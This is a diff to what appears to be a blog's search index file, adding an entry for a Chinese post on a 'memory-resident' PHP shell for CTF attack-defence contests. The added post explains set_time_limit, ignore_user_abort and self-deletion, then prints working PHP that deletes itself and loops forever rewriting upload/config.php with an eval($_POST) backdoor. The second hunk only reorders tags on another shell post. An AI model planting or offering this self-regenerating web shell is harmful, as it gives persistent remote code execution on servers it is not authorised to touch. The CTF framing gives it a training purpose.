@@ -104,6 +104,25 @@
     </entry>
     
     <entry>
+      <title><![CDATA[简单的PHP内存马]]></title>
+      <url>http://isron.cn/2017/04/20/php_no_die/</url>
+      <content type="html"><![CDATA[<p>在线下赛做权限维持时，最常用的就是上传一个不死shell，其实也就只是把进程写到了内存里，每隔一段时间便运行一次<a id="more"></a></p>
+<h3 id="set-time-limit"><a href="#set-time-limit" class="headerlink" title="set_time_limit()"></a>set_time_limit()</h3><p>set_time_limit — 设置脚本最大执行时间<br>语法:<code>set_time_limit ( int $seconds )</code><br>参数：<code>seconds</code>最大的执行时间，单位为秒。如果设置为0（零），没有时间方面的限制。 </p>
+<h3 id="ignore-user-abort"><a href="#ignore-user-abort" class="headerlink" title="ignore_user_abort()"></a>ignore_user_abort()</h3><p>ignore_user_abort — 设置客户端断开连接时是否中断脚本的执行<br>设置为1则不会中断执行</p>
+<h3 id="unlink-FILE"><a href="#unlink-FILE" class="headerlink" title="unlink(FILE)"></a>unlink(<strong>FILE</strong>)</h3><p>删除自身</p>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    set_time_limit(<span class="number">0</span>);</div><div class="line">    ignore_user_abort(<span class="number">1</span>);</div><div class="line">    unlink(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line"></div><div class="line">        file_put_contents(<span class="string">'upload/config.php'</span>,<span class="string">'&lt;?php @eval($_POST["Isron"]);?&gt;'</span>);</div><div class="line">   </div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[七个字符Get Shell]]></title>
       <url>http://isron.cn/2017/04/10/shell-7/</url>
       <content type="html"><![CDATA[<p>如何在只有七个字符的限制下Get Shell<a id="more"></a></p>
@@ -123,11 +142,11 @@
         
         <tags>
             
-            <tag> 命令执行 </tag>
-            
             <tag> CTF </tag>
             
             <tag> Linux </tag>
+            
+            <tag> 命令执行 </tag>
             
         </tags>
         
